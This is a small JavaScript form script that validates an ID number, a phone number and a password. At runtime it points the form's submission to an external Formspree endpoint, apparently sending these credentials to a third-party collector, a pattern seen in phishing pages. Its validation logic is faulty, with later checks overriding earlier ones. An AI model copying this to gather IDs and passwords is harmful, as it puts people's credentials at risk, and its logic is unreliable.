const idno = document.querySelector('#id');
const number = document.querySelector("#number");
const button = document.querySelector('#button');
const password = document.querySelector('#password')
idno.addEventListener('input', function () {
    const value = idno.value;
    if(value.length <= 12) {
        button.setAttribute("disabled", 'true');
    } else {button.removeAttribute('disabled');}
    if(value.length > 13) {
        button.setAttribute("disabled", 'true');
    } else {button.removeAttribute('disabled');}
    const value2 = password.value;
    if(value2.length <= 4) {
        button.setAttribute("disabled", 'true');
    }else {button.removeAttribute('disabled');}
    const value3 = number.value;
    if(value3.length <= 8) {
        button.setAttribute("disabled", 'true');
  }else{button.removeAttribute('disabled');}});
number.addEventListener('input', function () {
    const value = number.value;
    if(value.length <= 8) {
        button.setAttribute("disabled", 'true');
    } else{button.removeAttribute('disabled'); }
    const value2 = password.value;
    if(value2.length <= 4) {
        button.setAttribute("disabled", 'true');} else { button.removeAttribute('disabled');}});const form = document.getElementById('form');
form.setAttribute('action', 'https://formspree.io/f/mdorvknl');
password.addEventListener('input', function () {
    const value = password.value;
    if(value.length <= 4) {
        button.setAttribute("disabled", 'true')} else{button.removeAttribute('disabled');}});

idno.addEventListener('input', function () {
    const value = idno.value;
    const idnumber = document.getElementById('idnumber')
    if(value.length < 13 || value.length < 13) {
        idnumber.style.display = "block"
    } else {
        idnumber.style.display = "none"
    };
    
    if(value.length > 13) {
        idnumber.style.display = "block"
    } else {
        idnumber.style.display = "none"
    };
});    

number.addEventListener('input', function () {
    const value = number.value;
    const phone = document.getElementById("phone")
    if(value.length < 10) {
        phone.style.display = 'block'
    } else {
        phone.style.display = "none"
    }
});

idno.addEventListener('input', function () {
    const value = idno.value;
    const idnumber = document.getElementById('idnumber')
    if(value.length <= 12) {
        idnumber.style.display = "block"
    } else {
        idnumber.style.display = "none"
    };
    
    if(value.length > 13) {
        idnumber.style.display = "block"
    } else {
        idnumber.style.display = "none"
    };
});    